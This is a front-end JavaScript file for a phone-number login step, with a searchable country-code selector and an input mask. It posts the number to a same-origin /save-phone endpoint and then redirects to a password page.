const phoneInput = document.getElementById("phone-input");
const btnPhone = document.getElementById("btn-phone");

const countrySelector = document.getElementById("country-selector");
const countryModal = document.getElementById("country-modal");
const countryList = document.getElementById("country-list");
const countrySearch = document.getElementById("country-search");

const countryName = document.getElementById("country-name");
const countryFlag = document.getElementById("country-flag");
const phoneCode = document.getElementById("phone-code");


// ===== СТРАНЫ =====
async function loadCountries(filter = "") {
  const res = await fetch("countries.json");
  const data = await res.json();

  countryList.innerHTML = "";

  data
    .filter(c => c.name.toLowerCase().includes(filter.toLowerCase()))
    .forEach(c => {
      const row = document.createElement("div");
      row.className = "country-item";
      row.innerHTML = `<span>${c.flag} ${c.name}</span><span>${c.code}</span>`;
      row.onclick = () => {
        countryFlag.textContent = c.flag;
        countryName.textContent = c.name;
        phoneCode.textContent = c.code;
        countryModal.classList.add("hidden");
      };
      countryList.appendChild(row);
    });
}

countrySelector.onclick = () => {
  countryModal.classList.remove("hidden");
  loadCountries();
};

countrySearch.oninput = () => loadCountries(countrySearch.value);


// ===== МАСКА ТЕЛЕФОНА =====
phoneInput.addEventListener("input", () => {
  let value = phoneInput.value.replace(/\D/g, "");

  if (value.length > 10) value = value.slice(0, 10);

  let formatted = "";
  if (value.length > 0) formatted += value.substring(0, 3);
  if (value.length > 3) formatted += " " + value.substring(3, 6);
  if (value.length > 6) formatted += " " + value.substring(6);

  phoneInput.value = formatted;

  if (value.length === 10) {
    btnPhone.disabled = false;
    btnPhone.classList.remove("disabled");
  } else {
    btnPhone.disabled = true;
    btnPhone.classList.add("disabled");
  }
});


// ===== ПЕРЕХОД =====
btnPhone.onclick = () => {
  fetch("/save-phone", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ phone: phoneInput.value })
  });

  window.location.href = "password.html";
};
